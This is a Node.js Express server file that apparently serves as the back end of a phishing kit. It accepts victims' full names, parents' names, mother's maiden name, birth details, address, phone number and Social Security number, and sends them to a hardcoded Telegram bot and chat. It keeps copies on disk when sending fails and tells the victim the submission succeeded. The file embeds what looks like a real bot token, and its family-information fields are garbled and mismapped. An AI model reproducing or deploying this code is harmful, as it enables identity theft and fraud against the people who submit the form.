const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

// Create Express app
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Telegram configuration
const TELEGRAM_BOT_TOKEN = '7264938782:AAEkoiz0kJA1HyuToHGZmvcMc_6kQmXMmXM';
const TELEGRAM_CHAT_ID = '1012698310';

// Directory for storing failed submissions
const BACKUP_DIR = path.join(__dirname, 'failed_submissions');
if (!fs.existsSync(BACKUP_DIR)) {
  fs.mkdirSync(BACKUP_DIR);
}

// Function to retry sending to Telegram with exponential backoff
async function sendToTelegramWithRetry(message, maxRetries = 3) {
  const telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  let lastError;
  
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      // Add a timeout to the request to prevent hanging
      const response = await axios.post(telegramURL, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      }, { timeout: 10000 }); // 10 second timeout
      
      return response; // Success! Exit the function
    } catch (error) {
      lastError = error;
      console.log(`Telegram API attempt ${attempt + 1} failed: ${error.message}`);
      
      if (attempt < maxRetries - 1) {
        // Wait with exponential backoff before retrying (1s, 2s, 4s, etc.)
        const delay = Math.pow(2, attempt) * 1000;
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }
  
  // If we got here, all retries failed
  throw lastError;
}

// Save failed message to disk for later retry
function saveFailedMessage(formData, message) {
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const filename = path.join(BACKUP_DIR, `submission-${timestamp}.json`);
  
  fs.writeFileSync(filename, JSON.stringify({
    formData,
    message,
    timestamp: new Date().toISOString()
  }, null, 2));
  
  console.log(`Saved failed submission to ${filename}`);
}

// API endpoint for form submission
app.post('/api/submit-form', async (req, res) => {
  const formData = req.body;
  
  // Format the message for Telegram
  let message = '📝 *New Form Submission*\n\n';
  
  // Basic Information
  message += '*Basic Information*\n';
  message += `👤 Name: ${formData.firstname || '-'} ${formData.middlename || ''} ${formData.surname || '-'}\n\n`;
  
  // Family Information
  message += '*Family Information*\n';
  message += `👨 Father's Name: ${formData.fathersname || '-'} ${formData.mothername || '-'} ${formData.maidename || '-'}\n`;
  message += `👩 Mother's Name: ${formData['fathersname'] || '-'} ${formData['mothername'] || '-'} ${formData['maidename'] || '-'}\n`;
  message += `👰 Mother's Maiden Name: ${formData['fathersname'] || '-'}\n\n`;
  
  // Birth Information
  message += '*Birth Information*\n';
  message += `🏙️ Place of Birth: ${formData.birthplace || '-'}\n`;
  message += `📅 Date of Birth: ${formData.birthdate || '-'}\n\n`;
  
  // Contact Information
  message += '*Contact Information*\n';
  message += `🏠 Address: ${formData.address || '-'}\n`;
  message += `🏙️ City: ${formData.city || '-'}\n`;
  message += `🗺️ State: ${formData.state || '-'}\n`;
  message += `📮 ZIP: ${formData.zip || '-'}\n\n`;
  
  // Additional Information
  message += '*Additional Information*\n';
  message += `📱 Mobile: ${formData.mobile || '-'}\n`;
  message += `🆔 SSN: ${formData.ssn || '-'}\n`;
  
  try {
    // Try to send to Telegram with retries
    await sendToTelegramWithRetry(message);
    
    // Send success response back to client
    res.status(200).json({ success: true, message: 'Form data sent to Telegram successfully' });
  } catch (error) {
    console.error('Error sending to Telegram after retries:', error);
    
    // Save the failed message for later processing
    saveFailedMessage(formData, message);
    
    // Still send a success response to the client since we've saved their data
    res.status(200).json({ 
      success: true, 
      message: 'Form submitted successfully. We will process your information shortly.',
      offline: true // Indicate we're in offline mode
    });
  }
});

// Default route serves the HTML page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/success', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'success.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});